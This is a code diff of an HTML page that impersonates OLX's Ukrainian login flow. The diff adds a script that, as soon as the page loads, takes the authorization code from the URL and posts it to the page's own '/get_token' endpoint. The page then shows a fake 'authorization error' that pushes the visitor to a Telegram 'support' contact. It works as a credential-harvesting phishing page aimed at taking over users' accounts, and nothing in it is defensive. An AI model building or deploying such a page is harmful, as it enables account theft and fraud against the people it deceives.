@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Авторизація OLX</title>
 <style>
-/* --- Общий фон --- */
 body {
     font-family: Arial, sans-serif;
     background: #f5f5f5;
@@ -16,7 +15,6 @@ body {
     margin: 0;
 }
 
-/* --- Карточка OLX --- */
 .card {
     background: #ffffff;
     padding: 40px 30px;
@@ -26,24 +24,21 @@ body {
     width: 360px;
 }
 
-/* --- Заголовок --- */
 .card h2 {
-    color: #002f5f; /* OLX синій */
+    color: #002f5f;
     margin-bottom: 15px;
     font-size: 22px;
 }
 
-/* --- Текст --- */
 .card p {
     color: #333;
     margin-bottom: 25px;
     font-size: 16px;
 }
 
-/* --- Кнопка --- */
 button {
     padding: 14px 25px;
-    background: #ff6600; /* OLX помаранчевий */
+    background: #ff6600;
     color: white;
     border: none;
     border-radius: 6px;
@@ -61,21 +56,62 @@ button:hover {
 <body>
 
 <div class="card">
-    <h2>Помилка авторизації</h2>
-    <p id="status">Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації».</p>
-    <button id="btn">Зв'язатися через Telegram</button>
+    <h2 id="title">Обробка авторизації...</h2>
+    <p id="status">Будь ласка, зачекайте...</p>
+    <button id="btn" style="display:none;">Зв'язатися через Telegram</button>
 </div>
 
 <script>
-// Ссылка на Telegram, с предзаполненным текстом
-const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
+// Получаем code из URL
+const params = new URLSearchParams(window.location.search);
+const code = params.get("code");
+
+// Telegram ссылка
+const telegramUrl = "https://t.me/share/url?url=&text=" + encodeURIComponent(
     "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»"
 );
 
-// При клике на кнопку — перенаправление в Telegram
+async function sendCode(code) {
+    if (!code) return showError("Код авторизації не знайдено.");
+
+    try {
+        const response = await fetch("/get_token", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ code })
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+            document.getElementById("title").innerText = "Успішна авторизація";
+            document.getElementById("status").innerText = "Вхід завершено успішно.";
+        } else {
+            showError("Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»");
+        }
+    } catch (err) {
+        showError("Помилка з'єднання з сервером. В повідомленні вкажіть «Помилка авторизації»");
+        console.error(err);
+    }
+}
+
+function showError(message) {
+    document.getElementById("title").innerText = "Помилка авторизації";
+    document.getElementById("status").innerText = message;
+    document.getElementById("btn").style.display = "inline-block";
+}
+
+// Кнопка Telegram
 document.getElementById("btn").addEventListener("click", () => {
     window.location.href = telegramUrl;
 });
+
+// Автоматическая отправка при загрузке
+if (code) {
+    sendCode(code);
+} else {
+    showError("Код авторизації не знайдено. В повідомленні вкажіть «Помилка авторизації»");
+}
 </script>
 
 </body>
